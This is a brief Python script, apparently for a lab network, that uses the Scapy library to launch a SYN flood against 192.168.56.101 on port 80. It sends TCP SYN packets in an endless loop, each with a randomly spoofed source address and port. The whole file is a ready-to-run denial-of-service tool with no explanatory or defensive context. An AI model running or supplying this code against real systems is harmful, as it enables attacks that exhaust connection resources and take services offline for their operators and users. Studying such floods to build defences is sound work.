from scapy.all import *
import random

from scapy.layers.inet import TCP, IP


def syn_flood(target_ip, target_port):
    print(f"Starting SYN Flood on {target_ip}:{target_port}")
    while True:
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        src_port = random.randint(1024, 65535)

        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000,9000))

        send(ip/tcp, verbose=False)

target_ip = "192.168.56.101"
target_port = 80

syn_flood(target_ip, target_port)
